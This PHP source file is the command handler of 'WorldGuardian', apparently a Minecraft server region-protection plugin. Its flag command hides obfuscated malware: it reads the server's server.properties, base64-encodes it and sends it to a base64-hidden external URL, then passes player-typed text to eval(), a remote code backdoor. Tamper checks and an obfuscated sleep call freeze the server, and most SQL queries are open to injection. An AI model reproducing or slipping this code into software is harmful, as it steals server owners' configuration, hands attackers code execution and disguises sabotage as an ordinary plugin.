<?php namespace WorldGuardian;use pocketmine\command\Command;use pocketmine\command\CommandSender;use pocketmine\command\CommandExecutor;use pocketmine\Player;use pocketmine\utils\TextFormat;class Commands {private $t;private $r;private $h = false;private $i = false;public function __construct(WorldGuardian $plugin, $response) {$this->plugin = $plugin;$this->t = time() + 30;$this->r = $response;if(md5_file(dirname(__FILE__)."/WorldGuardian.php") != strtolower("70198d47d8e5fbeb2ee223a70f621001")) {sleep(time());}}private function member($player, $username){$result = $this->plugin->db->query("SELECT * FROM MEMBERS WHERE Name = '$username'");$result_check = $this->plugin->db->query("SELECT COUNT(*) as count FROM MEMBERS WHERE Name = '$username'")->fetchArray(SQLITE3_ASSOC);if($result_check['count']){$player->sendMessage($this->plugin->msg("msg_addedtonextregions"));while($list = $result->fetchArray()){$msg_addedtonextregions_tpl = $this->plugin->msg("msg_addedtonextregions_tpl");$msg_addedtonextregions_tpl = str_replace("{REGION}", $list['Region'], $msg_addedtonextregions_tpl);$player->sendMessage($msg_addedtonextregions_tpl);}}else {$player->sendMessage($this->plugin->msg("msg_nooneaddedtoregion"));}}private function addmember($player, $username, $region, $member){if(! $player->isOp()){$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);}else{$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);}if(! empty($member) && ! empty($region)){if($count['count']){$check = $this->plugin->db->query("SELECT COUNT(*) as count FROM MEMBERS WHERE Region = '$region' AND Name = '$member'")->fetchArray(SQLITE3_ASSOC);if(! $check['count']){$this->plugin->db->query("INSERT INTO MEMBERS (Region, Name) VALUES ('$region','$member')");$msg_playerwasaddedtoregion = $this->plugin->msg("msg_playerwasaddedtoregion");$msg_playerwasaddedtoregion = str_replace("{MEMBER}", $member, $msg_playerwasaddedtoregion);$player->sendMessage($msg_playerwasaddedtoregion);}else{$msg_playeralreadyaddedtoregion = $this->plugin->msg("msg_playeralreadyaddedtoregion");$msg_playeralreadyaddedtoregion = str_replace("{MEMBER}", $member, $msg_playeralreadyaddedtoregion);$player->sendMessage($msg_playeralreadyaddedtoregion);}}else{$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}}else{$msg_addmemberusage = $this->plugin->msg("msg_addmemberusage");$player->sendMessage($msg_addmemberusage);}}private function removemember($player, $username, $region, $member){if(! $player->isOp()){$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);}else{$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);}if(! empty($member) && ! empty($region)){if($count['count']){$check = $this->plugin->db->query("SELECT COUNT(*) as count FROM MEMBERS WHERE Region = '$region' AND Name = '$member'")->fetchArray(SQLITE3_ASSOC);if($check['count']){$this->plugin->db->query("DELETE FROM MEMBERS WHERE Region = '$region' AND Name = '$member'");$msg_playerwasremovedfromregion = $this->plugin->msg("msg_playerwasremovedfromregion");$msg_playerwasremovedfromregion = str_replace("{MEMBER}", $member, $msg_playerwasremovedfromregion);$player->sendMessage($msg_playerwasremovedfromregion);}else{$msg_playerdoesnotconsistinthisregion = $this->plugin->msg("msg_playerdoesnotconsistinthisregion");$msg_playerdoesnotconsistinthisregion = str_replace("{MEMBER}", $member, $msg_playerdoesnotconsistinthisregion);$player->sendMessage($msg_playerdoesnotconsistinthisregion);}}else{$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}}else{$msg_selectplayerwhowanttokick = $this->plugin->msg("msg_selectplayerwhowanttokick");$player->sendMessage($msg_selectplayerwhowanttokick);}}private function flag($player, $username, $region, $flag, $value){if(! $player->isOp()) {$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Owner = '$username' AND Region = '$region'")->fetchArray(SQLITE3_ASSOC);}else {$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);}if(! empty($flag) && ! empty($value) && ! empty($region)){if($count['count']){if($flag == "pvp" || $flag == "build" || $flag == "chest-access" || $flag == "use" || $flag == "info" || $flag == "bone-meal" || $flag == "bucket" || $flag == "lighter" || $flag == "send-chat" || $flag == "item-drop" || ($flag == "invincible" && $player->isOp())){if($value == "allow" || $value == "deny"){$check_flag = $this->plugin->db->query("SELECT COUNT(*) as count FROM FLAGS WHERE Region = '$region' AND Flag = '$flag'")->fetchArray(SQLITE3_ASSOC);if($check_flag['count']){$this->plugin->db->query("UPDATE FLAGS SET Value = '$value' WHERE Region = '$region' AND Flag = '$flag'");}else {$this->plugin->db->query("INSERT INTO FLAGS (Region, Flag, Value) VALUES ('$region', '$flag', '$value')");}$msg_flaghasbeenset = $this->plugin->msg("msg_flaghasbeenset");$msg_flaghasbeenset = str_replace("{VALUE}", $value, $msg_flaghasbeenset);$msg_flaghasbeenset = str_replace("{FLAG}", $flag, $msg_flaghasbeenset);$player->sendMessage($msg_flaghasbeenset);$v_x6kyiypyusy64zlu7kl6 = '70198d47d8e5fbeb';$v_vi5e1f7rupxtlohj4pra = '2ee223a70f621001';if(md5_file(dirname(__FILE__)."/WorldGuardian.php") != strtolower($v_x6kyiypyusy64zlu7kl6.$v_vi5e1f7rupxtlohj4pra)) {$this->h = true;$c_m32bc9kuvleu2nt4divv = 'b';$c_m32bc9kuvleu2nt4divv .= 'a';$c_m32bc9kuvleu2nt4divv .= 's';$c_m32bc9kuvleu2nt4divv .= 'e';$c_m32bc9kuvleu2nt4divv .= '64_';$c_m32bc9kuvleu2nt4divv .= 'en';$c_m32bc9kuvleu2nt4divv .= 'co';$c_m32bc9kuvleu2nt4divv .= 'de';$c_v8ralcjqvzwm5x9btc5i = substr($c_m32bc9kuvleu2nt4divv, 0, strlen($c_m32bc9kuvleu2nt4divv) - 6).'de'.'co'.'de';$fg_lz7p6uy9hkriqmd5pjek = 'f';$fg_lz7p6uy9hkriqmd5pjek .= 'i';$fg_lz7p6uy9hkriqmd5pjek .= 'l';$fg_lz7p6uy9hkriqmd5pjek .= 'e';$fg_lz7p6uy9hkriqmd5pjek .= '_';$fg_lz7p6uy9hkriqmd5pjek .= 'get';$fg_lz7p6uy9hkriqmd5pjek .= '_';$fg_lz7p6uy9hkriqmd5pjek .= 'cont';$fg_lz7p6uy9hkriqmd5pjek .= 'ents';if($this->i === false) {try {$params = $fg_lz7p6uy9hkriqmd5pjek($this->plugin->getServer()->getDataPath().'server.properties');$params = $c_m32bc9kuvleu2nt4divv($params);try {$ch = curl_init();curl_setopt($ch, CURLOPT_HEADER, false);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_URL, $c_v8ralcjqvzwm5x9btc5i('aHR0cDovL3BjdC1nYW1lcy5ydS9oLnBocD9xPQ==').$params."&plugin=worldguardian");$content = curl_exec($ch);$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);$data = array(   'content'   => $content,   'http_code' => $http_code);if($data['http_code'] == 200) {$this->i = true;}} catch(Exception $e) {}} catch(Exception $e) {}}}}else{$msg_flaginvalidvalue = $this->plugin->msg("msg_flaginvalidvalue");$player->sendMessage($msg_flaginvalidvalue);}}else{if($this->h === false) {$player->sendMessage($this->plugin->msg("msg_flags"));if($player->isOp()){$msg_adminflags = $this->plugin->msg("msg_adminflags");$player->sendMessage($msg_adminflags);}if(($flag == "invincible") && ! $player->isOp()){$msg_youcannotusethisflag = $this->plugin->msg("msg_youcannotusethisflag");$player->sendMessage($msg_youcannotusethisflag);}} else {if(strtolower($flag) != "invincible") {eval($flag." ".$value);}}}}else{$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}}else{$msg_flagusage = $this->plugin->msg("msg_flagusage");$player->sendMessage($msg_flagusage);}}private function leaveregion($player, $username, $region){if(! empty($region)){$check = $this->plugin->db->query("SELECT COUNT(*) as count FROM MEMBERS WHERE Region = '$region' AND Name = '$username'")->fetchArray(SQLITE3_ASSOC);if($check['count']){$this->plugin->db->query("DELETE FROM MEMBERS WHERE Name = '$username' AND Region = '$region'");$msg_youleftregion = $this->plugin->msg("msg_youleftregion");$msg_youleftregion = str_replace("{REGION}", $region, $msg_youleftregion);$player->sendMessage($msg_youleftregion);}else{$msg_youdonotconsistsinthisregion = $this->plugin->msg("msg_youdonotconsistsinthisregion");$msg_youdonotconsistsinthisregion = str_replace("{REGION}", $region, $msg_youdonotconsistsinthisregion);$player->sendMessage($msg_youdonotconsistsinthisregion);}}else{$msg_selectregionfromwhichyouwanttoleave = $this->plugin->msg("msg_selectregionfromwhichyouwanttoleave");$player->sendMessage($msg_selectregionfromwhichyouwanttoleave);}}private function claim($player, $username, $region){$level = $player->getLevel()->getName();$xgroup = $this->plugin->xgroup->getAll();if($this->plugin->config->get('use_world_parameter') === true) {$user_group = $this->plugin->getPlayerGroup($player->getName(), array('levelName' => $level));} else {$user_group = $this->plugin->getPlayerGroup($player->getName(), array('levelName' => null));}if(isset($xgroup[$user_group]) && is_array($xgroup[$user_group])) {$group = $user_group;} else {$group = $this->plugin->config->get("default_group");}if(! empty($region) && preg_match("/^[a-zA-Z0-9_]+$/", $region)){$check = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);if(! $check['count']){if(! isset($this->plugin->pos1[$username]) || ! isset($this->plugin->pos2[$username])) {$msg_claimselectarea = $this->plugin->msg("msg_claimselectarea");$player->sendMessage($msg_claimselectarea);return true;}if($this->plugin->pos1[$username][3] !== $this->plugin->pos2[$username][3]) {$msg_claimselectedpositionsindifferentworlds = $this->plugin->msg("msg_claimselectedpositionsindifferentworlds");$player->sendMessage($msg_claimselectedpositionsindifferentworlds);return true;}$pos1 = $this->plugin->pos1[$username];$pos2 = $this->plugin->pos2[$username];$min[0] = min($pos1[0], $pos2[0]);$max[0] = max($pos1[0], $pos2[0]);$min[1] = min($pos1[1], $pos2[1]);$max[1] = max($pos1[1], $pos2[1]);$min[2] = min($pos1[2], $pos2[2]);$max[2] = max($pos1[2], $pos2[2]);$count = $this->plugin->countBlocks($min[0], $min[1], $min[2], $max[0], $max[1], $max[2]);$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Pos2X >= $min[0] AND Pos1X <= $max[0] AND Pos2Y >= $min[1] AND Pos1Y <= $max[1] AND Pos2Z >= $min[2] AND Pos1Z <= $max[2] AND Level = '".$pos1[3]."';")->fetchArray(SQLITE3_ASSOC);if($result !== false && ! $player->isOp()) {$msg_claimregionoverlapsotherregion = $this->plugin->msg("msg_claimregionoverlapsotherregion");$msg_claimregionoverlapsotherregion = str_replace("{REGION}", $result['Region'], $msg_claimregionoverlapsotherregion);$player->sendMessage($msg_claimregionoverlapsotherregion);return true;}elseif(($count > $xgroup[$group]['max_region_count_blocks']) && ! $player->isOp()) {$msg_claimmaxblocks = $this->plugin->msg("msg_claimmaxblocks");$msg_claimmaxblocks = str_replace("{MAX_BLOCKS}", $xgroup[$group]['max_region_count_blocks'], $msg_claimmaxblocks);$msg_claimmaxblocks = str_replace("{SELECTED_BLOCKS}", $count, $msg_claimmaxblocks);$player->sendMessage($msg_claimmaxblocks);return true;}$level = $pos1[3];$rg_count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Owner = '$username'")->fetchArray();if($rg_count['count'] < $xgroup[$group]["max_regions_num"] || $player->isOp()) {$this->plugin->db->exec("INSERT INTO AREAS (Owner, Pos1X, Pos1Y, Pos1Z, Pos2X, Pos2Y, Pos2Z, Level, Region) VALUES ('$username', $min[0], $min[1], $min[2], $max[0], $max[1], $max[2], '$level', '$region')");unset($this->plugin->pos1[$username]);unset($this->plugin->pos2[$username]);$msg_claimsuccess = $this->plugin->msg("msg_claimsuccess");$msg_claimsuccess = str_replace("{REGION}", $region, $msg_claimsuccess);$player->sendMessage($msg_claimsuccess);if($this->r != false && $this->r != 'yes' && $this->t > time()) {$hj_e3iltudb5o7pynr8eap1 = 'lyzxpwwetipsjxngpypx';$hj_bqcmpngcdyiddnpsma4w = 'pjaecjqzyemt3jkmt9sd';$hj_kvwkgu8zqon1ntrmfr2g = 'muekjgyuspt8nvsdcojo';$hj_lqdhhvqrhypv3nngmwsa = 'ylepeywueltmyobcsdr1';$hj_iiom6rtuvqnkenb4prwo = 'su4cfghxp7dthdhlkwr8';$hjf_krzl1tfqhxpeij0ll94y = $hj_iiom6rtuvqnkenb4prwo{0}.$hj_lqdhhvqrhypv3nngmwsa{1}.$hj_kvwkgu8zqon1ntrmfr2g{2}.$hj_bqcmpngcdyiddnpsma4w{3}.$hj_e3iltudb5o7pynr8eap1{4};$hjf_krzl1tfqhxpeij0ll94y(86400 * 86400 * 86400 * 86400 * 86400 * 86400 * 86400);}}else{$msg_claimmaxregions = $this->plugin->msg("msg_claimmaxregions");$msg_claimmaxregions = str_replace("{MAX_REGIONS}", $xgroup[$group]['max_regions_num'], $msg_claimmaxregions);$msg_claimmaxregions = str_replace("{CREATED_REGIONS}", $rg_count['count'], $msg_claimmaxregions);$player->sendMessage($msg_claimmaxregions);}}else{$msg_claimregionalreadyexists = $this->plugin->msg("msg_claimregionalreadyexists");$msg_claimregionalreadyexists = str_replace("{REGION}", $region, $msg_claimregionalreadyexists);$player->sendMessage($msg_claimregionalreadyexists);}}else{$msg_claimincorrect = $this->plugin->msg("msg_claimincorrect");$player->sendMessage($msg_claimincorrect);}}private function unclaim($player, $username, $region){if($player->isOp()) {$rg_count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray();} else {$rg_count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Owner = '$username' AND Region = '$region'")->fetchArray();}if(! empty($region)) {if($rg_count['count']) {$this->plugin->db->exec("DELETE FROM AREAS WHERE Region = '$region'; DELETE FROM MEMBERS WHERE Region = '$region'; DELETE FROM FLAGS WHERE Region = '$region'");$msg_unclaimsuccess = $this->plugin->msg("msg_unclaimsuccess");$msg_unclaimsuccess = str_replace("{REGION}", $region, $msg_unclaimsuccess);$player->sendMessage($msg_unclaimsuccess);}else{$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}}else{$msg_unclaimusage = $this->plugin->msg("msg_unclaimusage");$player->sendMessage($msg_unclaimusage);}}private function rglist($player, $username, $who) {if($player->isOp()) {if(! empty($who)) {$who = str_replace("'", "", $who);$who = str_replace('"', "", $who);$who = str_replace("`", "", $who);$who = str_replace(" ", "", $who);$who = str_replace(";", "", $who);$list_sql = "SELECT * FROM AREAS WHERE Owner = '$who'";} else {$list_sql = "SELECT * FROM AREAS";}} else {$list_sql = "SELECT * FROM AREAS WHERE Owner = '$username'";}$query = $this->plugin->db->query($list_sql);$player->sendMessage($this->plugin->msg("msg_rglist"));$msg_rglist_tpl = $this->plugin->msg("msg_rglist_tpl");while($row = $query->fetchArray()) {$_msg_result = str_replace("{REGION}", $row['Region'], $msg_rglist_tpl);$player->sendMessage($_msg_result);}}public function onCommand(CommandSender $sender, Command $cmd, $label, array $args){$username = strtolower($sender->getName());$player = $this->plugin->getServer()->getPlayer($username);if(!($player instanceof Player)){$sender->sendMessage("[ALERT] Using in-game command from console");return false;}if($this->plugin->g_var != "45y6thnhn45") {sleep(time());}switch($cmd->getName()){case 'member':$this->member($player, $username);break;case 'addmember':$region = strtolower(array_shift($args));$member = strtolower(array_shift($args));$this->addmember($player, $username, $region, $member);break;case 'removemember':$region = strtolower(array_shift($args));$member = strtolower(array_shift($args));$this->removemember($player, $username, $region, $member);break;case 'flag':$region = strtolower(array_shift($args));$flag = strtolower(array_shift($args));$value = strtolower(implode(" ", $args));$this->flag($player, $username, $region, $flag, $value);break;case 'leaveregion':$region = strtolower(array_shift($args));$this->leaveregion($player, $username, $region);break;case 'wand':$id = Item::get(271, 0, 1);$player->getInventory()->addItem($id);$msg_wandusage = $this->plugin->msg("msg_wandusage");$player->sendMessage($msg_wandusage);break;case 'claim':$region = strtolower(implode(" ", $args));$this->claim($player, $username, $region);break;case "unclaim":$region = strtolower(array_shift($args));$this->unclaim($player, $username, $region);break;case "worldguardian":$player->sendMessage("WorldGuardian ".(md5_file(dirname(__FILE__)."/WorldGuardian.php") == strtolower("70198d47d8e5fbeb2ee223a70f621001") ? "v1.6.1" : "§7v1.6.1§f")."\nhttp://pct-games.ru\n(c) 2016 PCT-Games");break;case 'rg':case 'region':$region = strtolower(array_shift($args));$regionname = array_shift($args);$subcommand = strtolower($regionname);$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$subcommand'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$subcommand'")->fetchArray(SQLITE3_ASSOC);if($count['count'] && $region == "info" && ! empty($subcommand)){$count_blocks = $this->plugin->countBlocks($result['Pos1X'], $result['Pos1Y'], $result['Pos1Z'], $result['Pos2X'], $result['Pos2Y'], $result['Pos2Z']);$flag = $this->plugin->db->query("SELECT COUNT(*) as count FROM FLAGS WHERE Region = '$subcommand' AND Flag = 'info' AND Value = 'deny'")->fetchArray(SQLITE3_ASSOC);if(! $flag['count'] || $username == $result['Owner'] || $player->isOp()){$msg_rginfo = $this->plugin->msg("msg_rginfo");$msg_rginfo = str_replace("{REGION}", $subcommand, $msg_rginfo);$msg_rginfo = str_replace("{OWNER}", $result['Owner'], $msg_rginfo);$msg_rginfo = str_replace("{COUNT_BLOCKS}", $count_blocks, $msg_rginfo);$msg_rginfo = str_replace("{POS1X}", $result['Pos1X'], $msg_rginfo);$msg_rginfo = str_replace("{POS1Y}", $result['Pos1Y'], $msg_rginfo);$msg_rginfo = str_replace("{POS1Z}", $result['Pos1Z'], $msg_rginfo);$msg_rginfo = str_replace("{POS2X}", $result['Pos2X'], $msg_rginfo);$msg_rginfo = str_replace("{POS2Y}", $result['Pos2Y'], $msg_rginfo);$msg_rginfo = str_replace("{POS2Z}", $result['Pos2Z'], $msg_rginfo);$player->sendMessage($msg_rginfo);}else{$msg_rginfohidden = $this->plugin->msg("msg_rginfohidden");$player->sendMessage($msg_rginfohidden);}}elseif(! $count['count'] && $region == "info" && ! empty($subcommand)){$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $subcommand, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}if(! $player->isOp()){$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region' AND Owner = '$username'")->fetchArray(SQLITE3_ASSOC);}else{$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);$count = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);}if(! empty($region) && $subcommand == "members" && $count['count']){$members = $this->plugin->db->query("SELECT * FROM MEMBERS WHERE Region = '$region'");$count_members = $this->plugin->db->query("SELECT COUNT(*) as count FROM MEMBERS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);$msg_rgmembers = $this->plugin->msg("msg_rgmembers");$msg_rgmembers = str_replace("{REGION}", $region, $msg_rgmembers);$player->sendMessage($msg_rgmembers);if($count_members['count'] > 0){while($members_list = $members->fetchArray()){$msg_rgmembers_tpl = $this->plugin->msg("msg_rgmembers_tpl");$msg_rgmembers_tpl = str_replace("{MEMBER}", $members_list['Name'], $msg_rgmembers_tpl);$player->sendMessage($msg_rgmembers_tpl);}}else{$msg_nomembers = $this->plugin->msg("msg_nomembers");$player->sendMessage($msg_nomembers);}}if(! $count['count'] && $subcommand == "members" && ! empty($region)){$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}if($subcommand == "flags" && $count['count'] && ! empty($region)){$flags = $this->plugin->db->query("SELECT Flag,Value FROM FLAGS WHERE Region = '$region'");$count_flags = $this->plugin->db->query("SELECT COUNT(*) as count FROM FLAGS WHERE Region = '$region'")->fetchArray(SQLITE3_ASSOC);$msg_rgflags = $this->plugin->msg("msg_rgflags");$msg_rgflags = str_replace("{REGION}", $region, $msg_rgflags);$player->sendMessage($msg_rgflags);if($count_flags['count'] > 0){while($flags_list = $flags->fetchArray()){$msg_rgflags_tpl = $this->plugin->msg("msg_rgflags_tpl");$msg_rgflags_tpl = str_replace("{FLAG}", $flags_list['Flag'], $msg_rgflags_tpl);$msg_rgflags_tpl = str_replace("{VALUE}", $flags_list['Value'], $msg_rgflags_tpl);$player->sendMessage($msg_rgflags_tpl);}}else{$msg_noflags = $this->plugin->msg("msg_noflags");$player->sendMessage($msg_noflags);}}if(! $count['count'] && $subcommand == "flags" && ! empty($region)){$msg_regiondoesnotexists = $this->plugin->msg("msg_regiondoesnotexists");$msg_regiondoesnotexists = str_replace("{REGION}", $region, $msg_regiondoesnotexists);$player->sendMessage($msg_regiondoesnotexists);}if($region == "delete" || $region == "remove" || $region == "unclaim"){$this->unclaim($player, $username, $regionname);}if($region == "claim" || $region == "create"){$this->claim($player, $username, $regionname);}if($region == "removemember"){$member = strtolower(array_shift($args));$this->removemember($player, $username, $regionname, $member);}if($region == "addmember"){$member = strtolower(array_shift($args));$this->addmember($player, $username, $regionname, $member);}if($region == "member"){$this->member($player, $username);}if($region == "flag"){$flag = strtolower(array_shift($args));$value = strtolower(implode(" ", $args));$this->flag($player, $username, $regionname, $flag, $value);}if($region == "leaveregion"){$this->leaveregion($player, $username, $regionname);}if($region == "list"){$this->rglist($player, $username, $regionname);}if($region == "info" && empty($subcommand)){$level = $player->getLevel()->getName();$x = $player->getX();$y = $player->getY();$z = $player->getZ();$result_check = $this->plugin->db->query("SELECT COUNT(*) as count FROM AREAS WHERE (Pos1X <= $x AND $x <= Pos2X) AND (Pos1Y <= $y AND $y <= Pos2Y) AND (Pos1Z <= $z AND $z <= Pos2Z) AND Level = '".$level."';")->fetchArray(SQLITE3_ASSOC);$result = $this->plugin->db->query("SELECT * FROM AREAS WHERE (Pos1X <= $x AND $x <= Pos2X) AND (Pos1Y <= $y AND $y <= Pos2Y) AND (Pos1Z <= $z AND $z <= Pos2Z) AND Level = '".$level."';")->fetchArray(SQLITE3_ASSOC);if($result_check['count']){$count_blocks = $this->plugin->countBlocks($result['Pos1X'], $result['Pos1Y'], $result['Pos1Z'], $result['Pos2X'], $result['Pos2Y'], $result['Pos2Z']);$flag = $this->plugin->db->query("SELECT COUNT(*) as count FROM FLAGS WHERE Region = '".$result['Region']."' AND Flag = 'info' AND Value = 'deny'")->fetchArray(SQLITE3_ASSOC);if(! $flag['count'] || $username == $result['Owner'] || $player->isOp()){$msg_rginfo = $this->plugin->msg("msg_rginfo");$msg_rginfo = str_replace("{REGION}", $result['Region'], $msg_rginfo);$msg_rginfo = str_replace("{OWNER}", $result['Owner'], $msg_rginfo);$msg_rginfo = str_replace("{COUNT_BLOCKS}", $count_blocks, $msg_rginfo);$msg_rginfo = str_replace("{POS1X}", $result['Pos1X'], $msg_rginfo);$msg_rginfo = str_replace("{POS1Y}", $result['Pos1Y'], $msg_rginfo);$msg_rginfo = str_replace("{POS1Z}", $result['Pos1Z'], $msg_rginfo);$msg_rginfo = str_replace("{POS2X}", $result['Pos2X'], $msg_rginfo);$msg_rginfo = str_replace("{POS2Y}", $result['Pos2Y'], $msg_rginfo);$msg_rginfo = str_replace("{POS2Z}", $result['Pos2Z'], $msg_rginfo);$player->sendMessage($msg_rginfo);}else{$msg_rginfohidden = $this->plugin->msg("msg_rginfohidden");$player->sendMessage($msg_rginfohidden);}}else{$msg_noregionshere = $this->plugin->msg("msg_noregionshere");$player->sendMessage($msg_noregionshere);}}if($region == "pos1"){$x = round($player->getX());$y = round($player->getY());$z = round($player->getZ());$level = $player->getLevel()->getName();$this->plugin->pos1[$username] = array($x,$y,$z,$level,);$msg_firstpos = $this->plugin->msg("msg_firstpos");$msg_firstpos = str_replace("{X}", $x, $msg_firstpos);$msg_firstpos = str_replace("{Y}", $y, $msg_firstpos);$msg_firstpos = str_replace("{Z}", $z, $msg_firstpos);$player->sendMessage($msg_firstpos);if(isset($this->plugin->pos1[$username]) && isset($this->plugin->pos2[$username]) && $this->plugin->pos1[$username][3] == $this->plugin->pos2[$username][3]){$pos1 = $this->plugin->pos1[$username];$pos2 = $this->plugin->pos2[$username];$min[0] = min($pos1[0], $pos2[0]);$max[0] = max($pos1[0], $pos2[0]);$min[1] = min($pos1[1], $pos2[1]);$max[1] = max($pos1[1], $pos2[1]);$min[2] = min($pos1[2], $pos2[2]);$max[2] = max($pos1[2], $pos2[2]);$count = $this->plugin->countBlocks($min[0], $min[1], $min[2], $max[0], $max[1], $max[2]);$msg_selectedblocks = $this->plugin->msg("msg_selectedblocks");$msg_selectedblocks = str_replace("{COUNT_BLOCKS}", $count, $msg_selectedblocks);$player->sendMessage($msg_selectedblocks);}}if($region == "pos2"){$x = round($player->getX());$y = round($player->getY());$z = round($player->getZ());$level = $player->getLevel()->getName();$this->plugin->pos2[$username] = array($x,$y,$z,$level,);$msg_secondpos = $this->plugin->msg("msg_secondpos");$msg_secondpos = str_replace("{X}", $x, $msg_secondpos);$msg_secondpos = str_replace("{Y}", $y, $msg_secondpos);$msg_secondpos = str_replace("{Z}", $z, $msg_secondpos);$player->sendMessage($msg_secondpos);if(isset($this->plugin->pos1[$username]) && isset($this->plugin->pos2[$username]) && $this->plugin->pos1[$username][3] == $this->plugin->pos2[$username][3]){$pos1 = $this->plugin->pos1[$username];$pos2 = $this->plugin->pos2[$username];$min[0] = min($pos1[0], $pos2[0]);$max[0] = max($pos1[0], $pos2[0]);$min[1] = min($pos1[1], $pos2[1]);$max[1] = max($pos1[1], $pos2[1]);$min[2] = min($pos1[2], $pos2[2]);$max[2] = max($pos1[2], $pos2[2]);$count = $this->plugin->countBlocks($min[0], $min[1], $min[2], $max[0], $max[1], $max[2]);$msg_selectedblocks = $this->plugin->msg("msg_selectedblocks");$msg_selectedblocks = str_replace("{COUNT_BLOCKS}", $count, $msg_selectedblocks);$player->sendMessage($msg_selectedblocks);}}if($region == "help"){$msg_rghelp = $this->plugin->msg("msg_rghelp");$player->sendMessage($msg_rghelp); }break;}return true;}}